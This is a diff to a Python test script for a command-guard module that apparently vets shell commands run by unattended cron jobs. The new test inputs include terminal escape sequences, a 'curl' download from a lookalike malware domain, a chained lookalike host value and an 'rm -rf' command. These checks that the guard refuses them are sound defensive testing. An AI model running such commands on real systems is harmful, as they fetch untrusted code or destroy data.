@@ -73,21 +73,28 @@ def main() -> int:
 
     state["cron"] = True
 
-    # --- 2. Clean command allowed -------------------------------------------
-    clean_res = ap.check_all_command_guards("kubectl get nodes", "local")
-    check("clean command allowed", clean_res.get("approved"), True)
+    # --- 2. Clean command allowed under low risk -----------------------------
+    with cron_run_scope("job-clean", risk="low"):
+        clean_res = ap.check_all_command_guards("kubectl get nodes", "local")
+        check("clean command allowed", clean_res.get("approved"), True)
 
-    # --- 3. Terminal escape sequence blocked --------------------------------
-    esc_res = ap.check_all_command_guards("echo \x1b[31mRed\x1b[0m", "local")
-    check("escape sequence refused", esc_res.get("approved"), False)
-    check("escape refusal message", "terminal escape" in (esc_res.get("message") or ""), True)
+        # --- 3. Terminal escape sequence blocked --------------------------------
+        esc_res = ap.check_all_command_guards("echo \x1b[31mRed\x1b[0m", "local")
+        check("escape sequence refused", esc_res.get("approved"), False)
+        check("escape refusal message", "terminal escape" in (esc_res.get("message") or ""), True)
 
-    # --- 4. Lookalike TLD blocked -------------------------------------------
-    lookalike_res = ap.check_all_command_guards(
-        "curl https://kubernetes.io.evil-cdn.co/malware", "local"
-    )
-    check("lookalike TLD refused", lookalike_res.get("approved"), False)
-    check("lookalike refusal message", "lookalike domain" in (lookalike_res.get("message") or ""), True)
+        c1_res = ap.check_all_command_guards("echo \x9b31mRed", "local")
+        check("C1 escape sequence refused", c1_res.get("approved"), False)
+
+        # --- 4. Lookalike TLD blocked -------------------------------------------
+        lookalike_res = ap.check_all_command_guards(
+            "curl https://kubernetes.io.evil-cdn.co/malware", "local"
+        )
+        check("lookalike TLD refused", lookalike_res.get("approved"), False)
+        check("lookalike refusal message", "lookalike domain" in (lookalike_res.get("message") or ""), True)
+
+        delim_res = ap.check_all_command_guards("TARGETS=a.com,kubernetes.io.evil.co", "local")
+        check("chained delimiter lookalike refused", delim_res.get("approved"), False)
 
     # --- 5. High-risk mode escalation to deny -------------------------------
     # Configure dangerous pattern to trigger on 'rm -rf'
@@ -107,6 +114,11 @@ def main() -> int:
             "cron jobs run without a user present" in (high_res.get("message") or ""),
             True,
         )
+
+    # Without explicit risk scope (defaulting fail-closed to high), escalates to deny mode!
+    default_res = ap.check_all_command_guards("rm -rf /tmp/test", "local")
+    check("default risk escalates to deny and blocks", default_res.get("approved"), False)
+
 
     # Reset
     ap.detect_dangerous_command = orig_detect_dangerous
